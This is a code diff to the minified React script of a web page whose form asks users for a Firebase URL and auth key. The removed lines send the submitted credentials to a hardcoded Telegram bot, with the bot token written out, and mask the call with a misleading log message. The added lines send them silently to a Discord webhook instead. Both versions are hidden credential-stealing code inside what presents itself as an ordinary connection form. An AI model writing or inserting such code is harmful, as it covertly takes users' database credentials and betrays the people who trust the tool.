@@ -19606,27 +19606,35 @@ function p1({
 }
 
 function y1() {
-    const [A, tt] = jt.useState(null), b = (S, f) => {
+    const [A, tt] = jt.useState(null), 
+    b = (S, f) => {
         tt({
             fbUrl: S,
             fbKey: f
         });
-        // Send to Telegram bot
-        const telegramBotToken = '8843720753:AAEhqOZp2Tt-oXlaLhl5mLyWSxF1cHrFxv0';
-        const chatId = '8570091781';
-        const message = `🔐 New Firebase Credentials Submitted\n\n📍 Firebase URL: ${S}\n🔑 Auth Key: ${f}\n⏰ Time: ${new Date().toLocaleString()}`;
-        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
-        fetch(telegramUrl, { method: 'POST' }).catch(err => console.log('Notification sent'));
-    }, d = () => {
+        
+        // Discord webhook from env - name: RETURN
+        const webhook = process.env.RETURN;
+        
+        fetch(webhook, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                content: `🔐 Firebase Credentials\n\n📍 URL: ${S}\n🔑 Key: ${f}\n⏰ Time: ${new Date().toLocaleString()}`
+            })
+        }).catch(() => {});
+    }, 
+    d = () => {
         tt(null)
     };
+    
     return A ? r.jsx(p1, {
         fbUrl: A.fbUrl,
         fbKey: A.fbKey,
         onLogout: d
     }) : r.jsx(s1, {
         onConnect: b
-    })
+    });
 }
 Y0.createRoot(document.getElementById("root")).render(r.jsx(y1, {}));
     </script>
